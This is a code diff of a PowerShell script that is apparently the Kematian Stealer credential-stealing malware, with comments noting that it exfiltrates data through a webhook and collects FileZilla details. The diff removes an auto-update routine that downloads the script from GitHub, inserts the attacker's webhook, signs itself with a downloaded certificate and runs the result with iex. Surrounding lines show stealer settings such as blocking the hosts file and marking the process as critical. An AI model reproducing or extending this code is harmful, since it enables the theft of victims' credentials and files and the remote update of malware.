@@ -1,5 +1,4 @@
 $debug = $false
-$autoupdate = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
@@ -36,26 +35,6 @@ Add-Type -AssemblyName PresentationCore, PresentationFramework
 
 $webhook = "YOUR_WEBHOOK_HERE"
 $avatar = "https://i.imgur.com/DOIYOtp.gif"
-
-# This will overwrite the file at runtime therefore updating it before it exfiltrates
-function AUTOUPDATE {
-    if ($autoupdate) { 
-        $updateandrun = Invoke-WebRequest -Uri "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1" 
-        $updateandrun -replace "YOUR_WEBHOOK_HERE", $webhook | Out-File -FilePath $pscommandpath -Encoding ASCII
-        $url = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/Kematian.pfx"
-        $outputPath = "$env:tmp\Kematian.pfx"
-	if (Test-Path $outputPath) {Remove-Item $outputPath -Force}
-        Invoke-WebRequest -Uri $url -OutFile $outputPath 
-        $certificatePath = $outputPath
-        $certificatePassword = ConvertTo-SecureString -String "Kematian" -AsPlainText -Force
-        $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certificatePath, $certificatePassword)
-        Set-AuthenticodeSignature -FilePath $pscommandpath -Certificate $certificate -TimestampServer "http://timestamp.comodoca.com"
-        iex $pscommandpath
-    }
-    else {
-        KDMUTEX
-    }
-}
 
 #THIS CODE WAS MADE BY EvilByteCode
 Add-Type -TypeDefinition @"
@@ -1113,7 +1092,6 @@ FileZilla: $filezilla_info
 	# cleanup
     Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
-    Remove-Item "$env:tmp\Kematian.pfx" -Force 
 }
 
 function Invoke-TASKS {
@@ -1146,7 +1124,7 @@ if (CHECK_AND_PATCH -eq $true) {
         KDMUTEX
     }
     else {
-        AUTOUPDATE
+        KDMUTEX
     }    
     if ($debug) {
         pause
